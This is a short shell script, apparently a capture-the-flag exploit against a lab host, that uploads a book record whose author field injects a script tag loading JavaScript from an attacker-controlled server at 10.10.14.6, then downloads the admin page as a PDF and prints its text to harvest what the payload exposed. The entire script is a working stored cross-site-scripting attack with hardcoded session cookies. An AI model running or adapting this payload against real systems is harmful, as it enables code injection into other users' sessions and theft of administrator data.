#!/bin/sh
# be sure to replace the session cookies
curl -v 'http://10.10.10.176/collections.php' -X POST -F "Upload=@notes.txt" -F "title=Corpse Flower" -F 'author="<script src=\"http://10.10.14.6:8888/book/admin-too.js\"></script>"' -F "Upload=Upload" -H 'Cookie: PHPSESSID=r0hu3tpi52rg8tr8doi3i56cud' --compressed --insecure
sleep 1
curl -v 'http://10.10.10.176/admin/collections.php?type=collections' -H 'Cookie: PHPSESSID=tj3vj7ksnlrhsncho22ec6hak4' --compressed --insecure > out.pdf
pdftotext out.pdf out
cat out